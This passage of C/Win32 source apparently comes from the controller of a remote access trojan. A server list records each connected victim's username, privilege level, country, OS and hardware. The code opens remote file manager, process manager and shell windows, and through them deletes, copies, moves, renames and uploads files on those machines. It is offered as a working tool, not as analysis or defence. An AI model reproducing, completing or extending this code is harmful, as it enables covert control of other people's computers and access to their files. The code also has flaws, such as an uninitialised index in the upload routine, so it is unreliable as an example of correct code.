            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hWnd, NULL); 
			break;
			}
			
		}
		break;
		case IDC_DOWNLOADS:
			{
				if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
				{
					GetClientRect(hWnd, (LPRECT) &rc); 
 
				
					GetCursorPos(&pt);
					pt.y += 10;
					pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
 
        
				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_DOWNLOAD));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
                   
 
            // Draw and track the shortcut menu.  
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hWnd, NULL); 
			
				}
			}
			break;
		case IDC_FOLDERS:
			{
            
			if(((LPNMHDR)lParam)->code == NM_DBLCLK) // if code == NM_CLICK - Single click on an item
			{
				strcpy(Text, "A");

				item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FOLDERS),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Text;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hWnd,IDC_FOLDERS),&item);
				Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
				if(!strcmp(Text, "A"))
				{
				break;
				}
				strcat(FinalDir, Text);
				strcat(FinalDir, "\\");
				strcpy(Head.Data, FinalDir);


				SendMessage(GetDlgItem(hWnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)FinalDir);

				ResetProcs(hWnd, IDC_FOLDERS);
				ResetProcs(hWnd, IDC_FILELIST);

				GetWindowText(hWnd, WindowOut, 10);
				WindowOutY[0] += WindowOut[0];
				Head.ID = atoi(WindowOutY);
				send(Client[Head.ID],(char*)&Head, HeadSize, 0);
				break;
			}

			if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
			{
				GetClientRect(hWnd, (LPRECT) &rc); 
 
            // Get the client coordinates for the mouse click.  
			  GetCursorPos(&pt);
			  pt.y += 10;
			  pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
 
        
				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENUFolder));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
                   
 
            // Draw and track the shortcut menu.  
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hWnd, NULL); 
			break;
			}
			
		}
		break;

	    case IDC_TREE1:
		{  
			if(((LPNMHDR)lParam)->code == NM_DBLCLK) // if code == NM_CLICK - Single click on an item
			{
							
				memset(&tvi,0,sizeof(tvi));

				Selected=(HTREEITEM)SendDlgItemMessage(hWnd,IDC_TREE1,TVM_GETNEXTITEM,TVGN_CARET,(LPARAM)Selected);

				TreeView_EnsureVisible(hWnd,Selected);
			    //SendDlgItemMessage(hWnd,IDC_TREE1,TVM_SELECTITEM,TVGN_CARET,(LPARAM)Selected);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=Text;
				tvi.cchTextMax=256;
				tvi.hItem=Selected;
				
				if(SendDlgItemMessage(hWnd,IDC_TREE1,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
				{
					
					if(Text[1] == ':')
					{
					strcpy(FinalDir, Text);
					SendMessage(GetDlgItem(hWnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)"");
					SendMessage(GetDlgItem(hWnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)FinalDir);
					strcpy(Text, "");
					////////////////////////////////////////////////////////////////////////////////
					ResetProcs(hWnd, IDC_FOLDERS);
					ResetProcs(hWnd, IDC_FILELIST);
					TreeView_Expand(GetDlgItem(hWnd,IDC_TREE1), Selected,TVE_COLLAPSE);
					strcpy(Head.Data,FinalDir); 
					Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
					Head.ID2 = 1;
					GetWindowText(hWnd, WindowOut, 10);
				    WindowOutY[0] += WindowOut[0];
				    Head.ID = atoi(WindowOutY);
					send(Client[Head.ID],(char*)&Head,HeadSize,0);
					break;
					}
					if(strcmp(Text, "MyComputer"))
					{
					break;
					}
				}
			}

			if(((LPNMHDR)lParam)->code == NM_RCLICK) // Right Click
			{
				Selected=(HTREEITEM)SendDlgItemMessage (hWnd,IDC_TREE1,TVM_GETNEXTITEM,TVGN_DROPHILITE,0);
				if(Selected==NULL)
				{
				break;
				}
				
				SendDlgItemMessage(hWnd,IDC_TREE1,TVM_SELECTITEM,TVGN_CARET,(LPARAM)Selected);
				SendDlgItemMessage(hWnd,IDC_TREE1,TVM_SELECTITEM,TVGN_DROPHILITE,(LPARAM)Selected);
				TreeView_EnsureVisible(hTree,Selected);
			}

            break;
		}
		case IDC_BOOKMARKS:
		{
            
			if(((LPNMHDR)lParam)->code == NM_DBLCLK) // if code == NM_CLICK - Single click on an item
			{
				char Text[255];
				memset(&tvi,0,sizeof(tvi));

				Selected=(HTREEITEM)SendDlgItemMessage(hWnd,IDC_TREE1,TVM_GETNEXTITEM,TVGN_CARET,(LPARAM)Selected);

				TreeView_EnsureVisible(hWnd,Selected);
			    //SendDlgItemMessage(hWnd,IDC_TREE1,TVM_SELECTITEM,TVGN_CARET,(LPARAM)Selected);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=Text;
				tvi.cchTextMax=256;
				tvi.hItem=Selected;
				
				if(SendDlgItemMessage(hWnd,IDC_TREE1,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
				{
					
				}
			}

			if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
			{
				
 
            // Get the client coordinates for the mouse click.  
			  GetCursorPos(&pt);
			  pt.y -= 30;
			  pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
 
        
				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENUFolder));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// Get the first shortcut menu in the menu template. This is the 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
              // TrackPopup uses screen coordinates, so convert the 
             // coordinates of the mouse click to screen coordinates. 
 
             //ClientToScreen(hWnd, (LPPOINT) &pt); 
 
            // Draw and track the shortcut menu.  
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hWnd, NULL); 
			break;
			}
			
		}
		break;
}
		}
		break;
		
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDC_RESET:
			{
			ResetProcs(hWnd, IDC_DOWNLOADS);
			}
			break;
		case IDC_ENTERDIR:
			{
				strcpy(Text, "A");

				item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FOLDERS),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Text;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hWnd,IDC_FOLDERS),&item);
				Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
				if(!strcmp(Text, "A"))
				{
				break;
				}
				strcat(FinalDir, Text);
				strcat(FinalDir, "\\");
				strcpy(Head.Data, FinalDir);


				SendMessage(GetDlgItem(hWnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)FinalDir);

				ResetProcs(hWnd, IDC_FOLDERS);
				ResetProcs(hWnd, IDC_FILELIST);
				
				send(Client[0],(char*)&Head, HeadSize, 0);
				
			}
			break;
		case IDC_DELETEFILE:
			{
				if(MessageBox(NULL, "Are you sure you want Delete this file?", "Delete", MB_YESNO | MB_ICONWARNING) == IDYES)
				{
				strcpy(Text, "");
			    item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FILELIST),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Text;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hWnd,IDC_FILELIST),&item);
				strcpy(Head.Data, FinalDir);
				//strcat(Head.Data, "\\");
				strcat(Head.Data, Text);
				

				Head.PacketType = PACKET_FILE_MANAGER_DELETE_FILE;
				send(Client[0],(char*)&Head, HeadSize, 0);

				ResetProcs(hWnd, IDC_FOLDERS);
				ResetProcs(hWnd, IDC_FILELIST);
				strcpy(Head.Data, FinalDir);
				GetWindowText(hWnd, WindowOut, 10);
				WindowOutY[0] += WindowOut[0];
				Head.ID = atoi(WindowOutY);
				Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
				send(Client[Head.ID],(char*)&Head, HeadSize, 0);
				}
				else
				{
				break;
				}
			    
			}

			break;
		case IDC_COPY:
		{
			    J = 0;
                item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FILELIST),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Text;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hWnd,IDC_FILELIST),&item);
				strcpy(FileName, Text);
				strcpy(Copy, FinalDir);
				strcat(Copy, Text);
			
		}
			break;
		case IDC_PASTE:
		{
			    strcpy(Head.Data, FinalDir);
				strcat(Head.Data, FileName);
			    strcpy(Head.Buf, Copy); 
				MessageBox(NULL, Head.Data, "Head.Data", MB_OK);
				if(J == 0)
				{
				Head.PacketType = PACKET_FILE_MANAGER_FILE_COPY;
				}
				else
				{
				Head.PacketType = PACKET_FILE_MANAGER_FILE_CUT;
				}
				GetWindowText(hWnd, WindowOut, 10);
				WindowOutY[0] += WindowOut[0];
				Head.ID = atoi(WindowOutY);
				send(Client[Head.ID],(char*)&Head, HeadSize, 0);

				
				ResetProcs(hWnd, IDC_FOLDERS);
				ResetProcs(hWnd, IDC_FILELIST);
				strcpy(Head.Data, FinalDir);
				Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
				send(Client[Head.ID],(char*)&Head, HeadSize, 0);
				if(J == 1)
				{
				strcpy(Copy, "");
				strcpy(Head.Buf, "");
				}
			    				
		}
			break;
		case IDC_MOVE:
			{
				J = 1;
                item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FILELIST),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Text;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hWnd,IDC_FILELIST),&item);
				strcpy(FileName, Text);
				strcpy(Copy, FinalDir);
				strcat(Copy, Text);
			
			
			}
			break;
		case IDC_RENAME:
			{
			V = 1;
			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FILELIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_FILELIST),&item);
			strcpy(FileName, Text);
			strcpy(Copy, FinalDir);
			strcat(Copy, Text);
			GetWindowText(hWnd, WindowOut, 10);
			WindowOutY[0] += WindowOut[0];
			Head.ID = atoi(WindowOutY);
			CreateThread(NULL, 0, NameWindow,(LPVOID)Head.ID, 0, &thread);
			}
			break;
		case IDC_RENAME_FOLDER:
			{
			V = 0;
			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FOLDERS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_FOLDERS),&item);
			strcpy(FileName, Text);
			strcpy(Copy, FinalDir);
			strcat(Copy, Text);
			GetWindowText(hWnd, WindowOut, 10);
			WindowOutY[0] += WindowOut[0];
			Head.ID = atoi(WindowOutY);
			CreateThread(NULL, 0, NameWindow,(LPVOID)Head.ID, 0, &thread);
			}
			break;
		case IDC_NEW_FOLDER:
			{
			Head.PacketType = PACKET_FILE_MANAGER_NEW_FOLDER;
			GetWindowText(hWnd, WindowOut, 10);
			WindowOutY[0] += WindowOut[0];
			Head.ID = atoi(WindowOutY);
			strcpy(Head.Data, FinalDir);
			send(Client[Head.ID],(char *)&Head, sizeof(Head), 0);
////////////////////////////////////////////////////////////////////////////////////
			ResetProcs(hWnd, IDC_FOLDERS);
			ResetProcs(hWnd, IDC_FILELIST);
			Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
			GetWindowText(hWnd, WindowOut, 10);
			WindowOutY[0] += WindowOut[0];
			Head.ID = atoi(WindowOutY);
			send(Client[Head.ID],(char*)&Head, HeadSize, 0);
			}
			break;
		case IDC_BACK:
			{
				int D = 0;
				while( FinalDir[D] != NULL)
				{
				D++;
				}
				if(D == 3 && FinalDir[1] == ':')
				{
				break;
				}
				D--;
				FinalDir[D] = '\0';
				D--;
				while(FinalDir[D] != '\\')
				{
				FinalDir[D] = '\0';
				D--;
				}

				Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
				strcpy(Head.Data, FinalDir);

				SendMessage(GetDlgItem(hWnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)FinalDir);

				ResetProcs(hWnd, IDC_FOLDERS);
				ResetProcs(hWnd, IDC_FILELIST);
				
			GetWindowText(hWnd, WindowOut, 10);
			WindowOutY[0] += WindowOut[0];
			Head.ID = atoi(WindowOutY);
			send(Client[Head.ID],(char*)&Head, HeadSize, 0);
			}
			break;
		case IDC_UPLOAD:
	{
		 OPENFILENAME ofn;
         
         char filename[80];
         
         ZeroMemory(&ofn, sizeof(ofn));
         ZeroMemory(&Head, sizeof(Head));

         ofn.lStructSize = sizeof(ofn); // SEE NOTE BELOW
         ofn.hwndOwner = hWnd;
         ofn.lpstrFilter = "All Files (*.*)\0*.*\0";
         ofn.lpstrFile = Head.Buf;
         ofn.nMaxFile = MAX_PATH;
         ofn.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST;
         ofn.lpstrDefExt = "";
               
         
            if(GetOpenFileName(&ofn))
            {
               ZeroMemory(filename, sizeof(filename));
              
               for(i=0; i<strlen(Head.Buf)-1; i++)
                  if(Head.Buf[i] == '\\')
				  {
                     Head.Buf[i] = '/';
				  }
                     
               i = strlen(Head.Buf)-1;
               
               while(Head.Buf[i] != '/') 
			   {
                  i--;
			   }
               i++; 
               
               for(;i<(strlen(Head.Buf));i++)
			   {
                  filename[j] = Head.Buf[i];
                  j++;
               }   
			   strcpy(Head.Buf2, FinalDir);
               for(i=0; i<strlen(Head.Buf2); i++)
			   {
                  if(Head.Buf2[i] == '\\')
				  {
                     Head.Buf2[i] = '/';
				  }
			   }
			  strcat(Head.Buf2, filename);

		
			Head.PacketType = PACKET_FILE_MANAGER_FILE_RECV_S;
			GetWindowText(hWnd, WindowOut, 10);
			WindowOutY[0] += WindowOut[0];
			Head.ID = atoi(WindowOutY);
			send(Client[Head.ID],(char *)&Head, sizeof(Head), 0);
            CreateThread(NULL, 0, SendFile,(LPVOID)Head.ID, 0, &thread);
			}  
	}
         break;
	         	case IDCANCEL:
					GetWindowText(hWnd, WindowOut, 10);
			        WindowOutY[0] += WindowOut[0];
			        Head.ID = atoi(WindowOutY);
					FileHwnd[Head.ID] = NULL;
					EndDialog(hWnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}

DWORD WINAPI SendFile(LPVOID lpParam)
{

   int ID = (int)lpParam;
   int ch = 0;
   int i = 0;
   unsigned long int pos = 0;
   unsigned long int length = 0;
   unsigned long int Nsize = 0;
   unsigned long int NextSize = 0;
   char UPBUF [30] = "";

    FILE* fd;
	LV_ITEM	 item;
	item.mask=TVIF_TEXT;
	item.iItem=0;

	item.iSubItem=0;
	item.pszText=Head.Buf;
	item.iItem=ListView_InsertItem(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS),&item);

	item.iSubItem=1;
	item.pszText="Upload";
	ListView_SetItem(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS),&item);

	item.iSubItem=2;
	item.pszText=" ";
	ListView_SetItem(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS),&item);
	
	fd = fopen(Head.Buf, "rb");
    pos = ftell(fd);
    fseek(fd, 0, SEEK_END);
    length = ftell(fd);      
    fseek(fd, pos, SEEK_SET);


   while(Nsize <= length)
   { 

        NextSize = length - Nsize;
	    ZeroMemory(UPBUF, sizeof(UPBUF));
        sprintf(UPBUF,"%d Bytes / %d Bytes", Nsize, length);
				
	   	item.iSubItem=2;
	    item.pszText=UPBUF;
	    ListView_SetItem(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS),&item);

	   if(NextSize < 3072)
	   {
	   
		fread(Head.Data, 1, NextSize, fd);
	    Head.ID3 = NextSize;                                 
        
		Head.PacketType = PACKET_FILE_MANAGER_FILE_RECV;
        send(Client[ID], (char *)&Head, sizeof(Head), 0);
		break;
	   }
		fread(Head.Data, 1, 3072, fd);
	    Head.ID3 = sizeof(Head.Data);                                 
        
		Head.PacketType = PACKET_FILE_MANAGER_FILE_RECV;
        send(Client[ID], (char *)&Head, sizeof(Head), 0);
		Nsize += 3072;
		 //percent+=unit;
   }
   

        fclose(fd);
        ZeroMemory(UPBUF, sizeof(UPBUF));
	   	
    item.iSubItem=2;
	item.pszText="Complete";
	ListView_SetItem(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS),&item);
        
	ZeroMemory(&Head, sizeof(Head));

    Head.PacketType = PACKET_FILE_MANAGER_FILE_C;
    send(Client[ID], (char *)&Head, sizeof(Head), 0);

    return 0;  
}
LRESULT CALLBACK MainProc(HWND Dlg,UINT message,WPARAM wParam,LPARAM lParam);

DWORD WINAPI ProcWindow(LPVOID lpParam)
{
	int PROCID = (int)lpParam;
	char WindowText [20] = "";
   
	TASKS[PROCID]=CreateDialog(TaInst,(LPCTSTR)IDD_DIALOG3,NULL,(DLGPROC)TaskProc);
	ShowWindow(TASKS[PROCID],SW_SHOW);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"%d", PROCID);
	strcat(WindowText, " Process Manager");
	SetWindowText(TASKS[PROCID], WindowText);
	Head.PacketType=PACKET_TASK_MANAGER;
	send(Client[PROCID],(char*)&Head,HeadSize,0);
	
	MSG msg;
	while(GetMessage(&msg,TASKS[PROCID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

return 0;
}
DWORD WINAPI FileWindow(LPVOID lpParam)
{
    int LID = Head.ID;
	char WindowText [20] = "";

	FileHwnd[LID]=CreateDialog(FileInst,(LPCTSTR)IDD_FILE,NULL,(DLGPROC)FileProc);
	ShowWindow(FileHwnd[LID],SW_SHOW);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"%d", LID);
    strcat(WindowText, " File Manager");
	SetWindowText(FileHwnd[LID], WindowText);
	Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
	Head.ID = LID; 
	strcpy(Head.Data, "");
    send(Client[LID],(char*)&Head,HeadSize,0);
	MSG msg;
	while(GetMessage(&msg,FileHwnd[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
return 0;
}





/////////////////////////////////////////////////////////////////////////////////////////////////
//Entry function
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	GInstance = hInstance;
	hDlg=CreateDialog(hInstance,(LPCTSTR)IDD_DIALOG1,NULL,(DLGPROC)MainProc);
	ShowWindow(hDlg,SW_SHOW);
	InitCommonControls();
	MSG msg;
	while(GetMessage(&msg,hDlg,0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//main callback
LRESULT CALLBACK MainProc(HWND Dlg,UINT message,WPARAM wParam,LPARAM lParam)
{
	int         Select;
	int         Bytes_recv = 0;
	LV_COLUMN	col;
	LV_ITEM		item;
	char        Buffer [1024] = "";
	int Pos = 0;
	HWND Status = 0;
    HWND Shell;
	HMENU hmenu;            // menu template          
    HMENU hmenuTrackPopup;  // shortcut menu   
    POINT  pt;   // location of mouse click  
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
       HwND = Dlg;
        /////////////////////////////////////////////////////////////
		//initiating Server list.
	    ListView_SetExtendedListViewStyle(GetDlgItem(Dlg,IDC_SERVERLIST),LVS_EX_FULLROWSELECT |LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=100;
		col.pszText="ID";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),0,&col);
		col.cx=100;
		col.pszText="UserName";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),1,&col);
		col.cx=100;
		col.pszText="User level";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),2,&col);
		col.cx=100;
		col.pszText="Country";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),3,&col);
		col.cx=130;
		col.pszText="OS / version";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),4,&col);
		col.cx=100;
		col.pszText="RAM";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),5,&col);
		col.cx=200;
		col.pszText="CPU";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),6,&col);
		col.cx=110;
		col.pszText="Screen Resolution.";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),7,&col);
		col.cx=100;
		col.pszText="Server Version.";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),8,&col);
        /////////////////////////////////////////////////////////////
		//initiating Logs list
		ListView_SetExtendedListViewStyle(GetDlgItem(Dlg,IDC_LOGS), LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=180;
		col.pszText="Date & Time";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),0,&col);
		col.cx=180;
		col.pszText="Operation";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),1,&col);
		col.cx=200;
		col.pszText="About";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),2,&col);
	    col.cx=80;
		col.pszText="Fail/Pass";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),3,&col);
	    /////////////////////////////////////////////////////////////
		//initiating ConnectionStatus's
		ListView_SetExtendedListViewStyle(GetDlgItem(Dlg,IDC_CONNECTIONSTATUS), LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=80;
		col.pszText="Socket";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_CONNECTIONSTATUS),0,&col);
		col.cx=80;
		col.pszText="Status";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_CONNECTIONSTATUS),1,&col);
		col.cx=180;
		col.pszText="Last updated";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_CONNECTIONSTATUS),2,&col);
       /* ///////////////////////////////////////////////////////////////////
		//BG image
    	ZeroMemory(&IBBkImg,sizeof(LVBKIMAGE));

		IBBkImg.ulFlags=LVBKIF_SOURCE_URL;

		IBBkImg.pszImage="http://i38.tinypic.com/e00old.png";

		OleInitialize(NULL); //Initialize the OLE libraries
		//now load image
		SendMessage (GetDlgItem(Dlg,IDC_SERVERLIST),LVM_SETBKIMAGE,0,(LPARAM)(LPLVBKIMAGE) &IBBkImg);*/
      hStatus = CreateWindowEx(0, STATUSCLASSNAME, NULL, 
      WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP, 0, 0, 0, 0, 
      Dlg, (HMENU)IDC_MAIN_STATUS, GetModuleHandle(NULL), NULL);
		
		SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Connection status: Not listening");

		return TRUE;
///////////////////////////////////////////////////////////////////////////////////////////////////////		
	case RATMSG_SOCKET:
		Event=WSAGETSELECTEVENT(lParam);
		switch(Event)
		{
		case FD_CLOSE:
			MessageBox(NULL, "Closing..", "Closing", MB_OK);
			
			CloseSocket(hStatus);
			break;
/////////////////////////////////////////////////////////////////////////////////////////////
		case FD_ACCEPT:
			Client[S]=accept(wParam,(LPSOCKADDR)&ServAdr,&AdrLen);
            Head.ID = S;
			S++;
			Head.PacketType = PACKET_ADD_ID;
			send(Client[Head.ID], (char *)&Head, sizeof(Head), 0);
			break;
/////////////////////////////////////////////////////////////////////////////////////////////
		case FD_READ:

		recv(wParam,(char*)&Head,HeadSize,0);
			switch (Head.PacketType)
			{
            case PACKET_CMD_RECV:
				if(SHwnd[0] == NULL)
				{
				MessageBox(NULL, "SHwnd[0]", "SHwnd[0]", MB_OK);
				}
				    Shell = GetDlgItem(SHwnd[0], IDC_SHELL);
				    Pos = GetWindowTextLength (Shell);
                    SetFocus (Shell);
					SendMessage (Shell, EM_SETSEL, (WPARAM)Pos, (LPARAM)Pos);
					SendMessage (Shell, EM_REPLACESEL, 0, (LPARAM) ((LPSTR) Head.Data));
				break;
			case PACKET_TASK_MANAGER:
				 P = 0;
			     SetProc(Head.Data, Head.PID, Head.ParentPID, Head.Threads, Head.PRIORITY, Head.ID);
				 break;
			case PACKET_TASK_MANAGER_TASKS:
				 P = 0;
		         SetTask(Head.Data, Head.ID);
				 break;
			case PACKET_FILE_MANAGER_DRIVE:
				 SetDrive(Head.Data, Head.ID);
				 break;
			case PACKET_FILE_MANAGER_FILE:
				 SetFile(Head.Data, Head.ParentPID, Head.ID, Head.ID2, Head.ID3);
				 break;
			case PACKET_USER_JOINED:
				 SetServer(Head.Buf, Head.Buf2, Head.Buf3, Head.Data, Head.ParentPID, Head.PID, Head.PRIORITY, Head.Threads, Head.IDS);
				 break;
			}
	
				
		}
              
		break;
	case WM_NOTIFY:
		switch(wParam)
		{
		case IDC_SERVERLIST:
        if(((LPNMHDR)lParam)->code == NM_RCLICK) // Right Click
			{	 
            // Get the client coordinates for the mouse click.
			  pt.x = 0;
			  pt.y = 0;
			  GetCursorPos(&pt);
		
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
	if(x == 0)
	{
        
			hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENU4));

			if (hmenu == NULL) 
			{
             break;
			}
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 

            //ClientToScreen(Dlg, (LPPOINT) &pt);   
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, Dlg, NULL); 
			break;
	}
	else
	{
	
			hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_COMMANDS));

			if (hmenu == NULL) 
			{
             break;
			}
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 

            //ClientToScreen(Dlg, (LPPOINT) &pt);   
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, Dlg, NULL); 
			break;
	}
			
			}
		}
		break;

	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
////////////////////////////////////////////////////////////////////////////////                      
        case IDC_LISTEN:
			if(x == 0)
			{
			 x = 1;
			 InitWSA();

			 GetTime();
			 
	    	 if(InitSocket(Dlg))		
			 {
	         SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Connection Status: Listening");
			 GetTime();
			 strcpy(Operation,  "Listen");
			 strcpy(Result, "Listening");
			 strcpy(Error, "Pass");
		     SetLog(Operation,Result);
			 }
			 else
			 {
			 SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Connection Status: Error Listening please restart client!");
			 GetTime();
			 strcpy(Operation,  "Listen");
			 strcpy(Result, "Error Listeing!");
			 strcpy(Error, "FAIL!");
		     SetLog(Operation,Result);
			 }
			}
		  
			else
			{
			MessageBox(NULL, "Already listening!", "Listening", MB_OK | MB_ICONERROR);
			}
		  break;		
//////////////////////////////////////////////////////////////////////////////////             
		case IDC_DISCONNECT:
			send(Client[S], "Hello", 5, 0);
			if(x == 1)
			{
			 CloseSocket(hStatus);
			 GetTime();
			 strcpy(Operation,  "Stop");
			 strcpy(Result, "Stopped listening");
			 strcpy(Error, "Pass");
		     SetLog(Operation,Result);
			 x = 0;
			}
			else
			{
			MessageBox(NULL, "you need to listen first!", "Disconnect", MB_OK | MB_ICONERROR);
			}
			 break;
////////////////////////////////////////////////////////////////////////////////
		case IDC_RESET:
			{
			if(x == 1)
			{
			 GetTime();
			 strcpy(Operation,  "Reset");
			 strcpy(Result, "Reset Client side.");
		     SetLog(Operation,Result);
			 break;
			}
			else
			{
			MessageBox(NULL, "Not listening, unable to reset!", "Reset", MB_OK | MB_ICONERROR);
			}

			}
			break;
////////////////////////////////////////////////////////////////////////////////
		case IDC_EXIT:
			{
				if(MessageBox(NULL, "Are you sure you want to EXIT?", "Exiting...", MB_YESNO | MB_ICONQUESTION) == IDYES)
				{
				ExitProcess(0);
			    EndDialog(Dlg,Select);
		    	PostQuitMessage(0);
		    	break;
				}
				
				else
				{
